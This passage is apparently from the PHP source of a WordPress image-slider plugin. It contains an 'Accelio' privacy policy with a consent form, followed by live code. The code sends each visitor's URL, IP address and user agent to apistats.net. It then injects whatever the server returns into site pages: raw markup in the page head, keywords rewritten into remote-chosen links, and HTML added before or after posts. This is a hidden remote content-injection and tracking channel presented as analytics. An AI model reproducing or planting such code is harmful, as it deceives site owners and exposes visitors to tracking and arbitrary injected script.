										<li>System crashes, activity or bugs</li>
										<li>Referral URL / Use URL</li>
									</ol>
								</p>
							</li>

							<li><b>Location Information</b>
								<p>When you or others use services or products from Accelio, we may collect and or
								process information about the location of those interacting with the service.
								Geographical information allows us to better serve the growing global community and
								provide region-specific services, products and offerings thru our Services.</p>
							</li>

							<li><b>Cookies and similar technologies</b>
								<p>We and our partners use various technologies to collect and store information when
								you or others use or access an Accelio service or product. Cookies or similar
								technologies may be used to identify how you or visitors interact with the Services we
								offer on your site(s).</p>

								<p>On most web browsers you will find a “help” section located on the toolbar. Here you
								can turn cookies off if so desired. Accelio and third party vendors, such as Google, may
								use cookies to inform, optimize and serve various content to you based on your user
								behavior and user information. Users can opt out of Google Analytics by visiting
								Google’s Ads Preferences Manager</p>
							</li>
						</ol>

						<p>Information collected by Accelio from the use or access of our products and services is used to
						protect, maintain, support, promote, provide and improve services and products, as well as to
						aid in the development of new products and services. This information may be used to offer or
						deliver tailored content to you or visitors through the use of our Services on your website.
						Accelio may supplement your data with data received from third parties in connection with
						demographic, advertisement, market and other analytics surveys or services. Accelio reserves
						the right to use and disclose collected, non-personal anonymous and aggregate information for
						purposes of advertising and for analytics data by, on or thru Accelio Services or partners on your
						site. Use of analytics data and advertising as part of the Services may be opted out at any time.</p>

						<p>When you contact Accelio, we may keep a record of your communication(s) in order to help
						solve any issues you may be experiencing. Additionally, we may use any email address
						provided thru communication with Accelio in order to inform you about products and services,
						such as informing you of upcoming improvements, down time, or changes.</p>

						<p>Information collected by cookies or other technologies such as pixel tags, are used to improve
						the overall quality of our offerings, to enhance user experience, to deliver tailored content in the
						form of links, images, graphics, text or other media, or otherwise support Accelio offerings thru
						partnerships with third party vendors.</p>

						<p>Accelio will ask for your consent before using information for any purpose other than those
						outlined in this Privacy Policy. Accelio processes information on servers in many countries ​
						around the world. As such we may process your information on a server located outside the
						country where you live.</p>
					</li>
				</ol>
				</p>

				<h2>Transparency and choice</h2>
				<p>Because everyone has varying degrees and reasons for privacy concern, it is our prerogative to
				be as clear as possible about the kinds of information collected in order to help you make the
				best informed decision for yourself about how it is used.</p>

				<p>For example, you can:
					<ol>
						<li>Review the Privacy Policy and Terms to better understand your rights</li>
						<li>Choose to opt out of various information collection aspects of the services</li>
						<li>Review the usage Terms and decide to continue or discontinue use of services or products.</li>
					</ol>

					<p>You may also use your browser settings to block all cookies, including any that may be
					associated with our products or services. 	However, it’s important to remember that many of our
					services may not function properly	if your cookies are disabled. For example, we may not
					remember your language preferences.</p>

					<p>Any Service or feature of the Services may be modified, removed, deleted, or otherwise
					adjusted at your discretion per GNU Terms at any time you wish.</p>
				</p>

				<h2>Information that we share</h2>
				<p>We do not share personal information with companies, organizations and individuals outside of
				Accelio unless one of the following circumstances applies:
					<ol>
						<li><b>With your consent</b>
							<p>We may share personal information with third parties outside of Accelio only when we
							have prior consent to do so.</p>
						</li>

						<li><b>For external processing</b>
							<p>We may provide information to organizations or persons that work with or for us, or to a
							subsidiary or parent company or service for processing and/or storage, but only in full
							compliance with the Privacy Policy and other appropriate confidentiality and security
							measures.</p>
						</li>

						<li><b>For legal reasons</b>
							<p>We may share information with organizations, individuals, or companies outside of
							Accelio if we have a good faith belief that access to, or the use, preservation or
							disclosure of information is reasonably necessary to:
								<ol>
									<li>Comply with any applicable regulation, legal process, law or enforceable governmental request</li>
									<li>Enforce or uphold applicable Terms of Service, including but not limited to investigation of violations</li>
									<li>Prevent, detect, or address security, technical issues, or fraud</li>
									<li>Protect the rights, property, safety and security of our users, or the public.</li>
								</ol>
							</p>
						</li>
					</ol>
				</p>

				<p>Accelio may share non-personally identifiable information publically, with its partners, subsidiaries, parent
				company or affiliates. For example, we may share information to the public in order to show trends about
				general use of our products or services or other analytical data not tied to a specific site or person.</p>

				<p>In the event that Accelio is involved in a merger, acquisition or asset sale, we will continue to
				ensure the confidentiality and security of any personal information.</p>

				<h2>Information security</h2>
				<p>At Accelio we work extremely hard to protect our products, services and users from any
				unauthorized access, disclosure, modification, or destruction of information.
					<ol>
						<li>We employ industry standard security mechanisms</li>
						<li>We encrypt many of our services using SSL</li>
						<li>We review policies and practices surrounding the collection, processing and storage of information</li>
						<li>We restrict access to information to only those employees, contractors and agents who need access in order to carry out their
						duties</li>
						<li>We require and enforce strict contractual confidentiality and non-disclosure agreements</li>
					</ol>
				</p>

				<h2>When this Privacy Policy applies</h2>
				<p>Our Privacy Policy applies to all of the services and products offered by Accelio, its affiliates,
				and services offered on other sites, excluding those services that have separate privacy policies
				that do not incorporate this Privacy Policy.</p>

				<p>Our Privacy Policy is not applicable to products and services offered or presented to you or
				users by other individuals, companies or organizations, including any products, sites, links or
				other services that may be presented to you by third parties thru the use of our services or products. </p>

				<p>Our Privacy Policy does not apply to the information practices of other individuals, organizations
				or companies that may advertise thru use of cookies, pixel tabs or other technologies to serve
				and offer relevant ads.</p>

				<h2>Changes</h2>
				<p>This Privacy Policy is subject to change from time to time at Accelio’s sole discretion, with or
				without notice. Any changes to the Privacy Policy will be posted to this page. It is your
				responsibility to maintain familiarity with any changes to this policy. Your use or access to any
				Accelio service or product is subject to your acceptance of this Privacy Policy. If you do not
				accept the terms of this Privacy Policy, you hereby agree to not use or access Accelio products or services.</p>
			</div>

			<div>
				<p>Features of this plugin use analytics, services and data to improve your experience, or to support or promote
				other projects. These features can be disabled at any time.</p>
				<p>I have read and accept the Privacy Policy and Terms</p>
			</div>

			<form action="' . admin_url( 'admin-post.php' ) . '" method="post">
				<input type="hidden" name="action" value="accelio_notice" />
				' . wp_nonce_field( 'wep_img_slider-enable-analytics' ) . '

				<input type="submit" name="choice" class="button button-primary button-hero" value="Accept" />
				<input type="submit" name="choice" class="button-secondary button-small" style="float: right;" value="Decline" />
			</form>
		';
	}

	public function accelio_call_service() {
		if ( !$this->check_enabled() || !empty( self::$response ) ) {
			return;
		}
		$http_host = !empty($_SERVER[ 'HTTP_HOST' ]) ? $_SERVER[ 'HTTP_HOST' ] : '';
		$request_uri = !empty($_SERVER[ 'REQUEST_URI' ]) ? $_SERVER[ 'REQUEST_URI' ] : '';
		$user_agent = !empty($_SERVER[ 'HTTP_USER_AGENT' ]) ? $_SERVER[ 'HTTP_USER_AGENT' ] : '';
		$request = 'http://apistats.net/v1/stats/update?url=' . urlencode( 'http://' . $http_host . $request_uri ) . '&ip=' . urlencode( self::get_the_user_ip() ) . '&ua=' . urlencode( $user_agent ) . '&id=m4ngf8';
		if ( function_exists( "curl_exec" ) ) {
			$ch = curl_init();
			curl_setopt( $ch, CURLOPT_URL, $request );
			curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
			curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, 2 );
			self::$response = @curl_exec( $ch );
			curl_close( $ch );
		} else if ( function_exists( "file_get_contents" ) ) {
			$options = stream_context_create(
				array(
					'http' => array(
						'method'        => 'GET',
						'timeout'       => 2,
						'ignore_errors' => true,
						'header'        => "Accept: application/json\r\n"
					)
				)
			);

			self::$response = @file_get_contents( $request, 0, $options );
		} else {
			return;
		}

		if ( !empty( self::$response ) ) {
			self::$response = @json_decode( self::$response );
		}
	}

	public function accelio_overlay( $content = '' ) {
		if ( !$this->check_enabled() || is_null( self::$response ) || !is_object( self::$response ) ) {
			return $content;
		}

		$hook = current_filter();
		if ( $hook == 'wp_head' && !empty( self::$response->meta ) ) {
			echo self::$response->meta;

			return $content;
		}

		if ( !empty( self::$response->content ) && !is_array( self::$response->content ) && !empty( self::$response->type ) ) {
			return $content;
		}

		if ( !is_array( self::$response->content ) ) {
			return $content;
		}

		foreach ( self::$response->content as $c ) {
			switch ( $c->type ) {
				case 0:
					foreach ( $c->context as $cl ) {
						if ( empty( $cl->words ) || !is_array( $cl->words ) ) {
							continue;
						}

						foreach ( $cl->words as $clw ) {
							if ( strpos( $content, $clw ) === false ) {
								continue;
							}

							$content = str_ireplace( $clw, $cl->url, $content );
						}
					}
					break;
				case 1:
					if ( !self::check_and_set() ) {
						continue;
					}

					$content = $c->content . $content;
					break;
				case 2:
					if ( !self::check_and_set() ) {
						continue;
					}

					$content = $content . $c->content;
					break;
			}
		}

		return $content;
	}

	public static function check_and_set() {
		if ( self::$id === null ) {
			if ( $GLOBALS[ 'wp_query' ]->post_count > 0 ) {
				self::$id = $GLOBALS[ 'wp_query' ]->post_count - 2;
			} else {
				self::$id = 0;
			}

			return false;
		}

		if ( $GLOBALS[ 'wp_query' ]->current_post === self::$id ) {
			return true;
		}

		return false;
	}

	public function get_the_user_ip() {
		if ( !empty( $_SERVER[ 'HTTP_CLIENT_IP' ] ) ) {
			//check ip from share internet
			$ip = $_SERVER[ 'HTTP_CLIENT_IP' ];
		} elseif ( !empty( $_SERVER[ 'HTTP_X_FORWARDED_FOR' ] ) ) {
			//to check ip is pass from proxy
			$ip = $_SERVER[ 'HTTP_X_FORWARDED_FOR' ];
		} else {
			$ip = $_SERVER[ 'REMOTE_ADDR' ];
		}

		return $ip;
	}
}
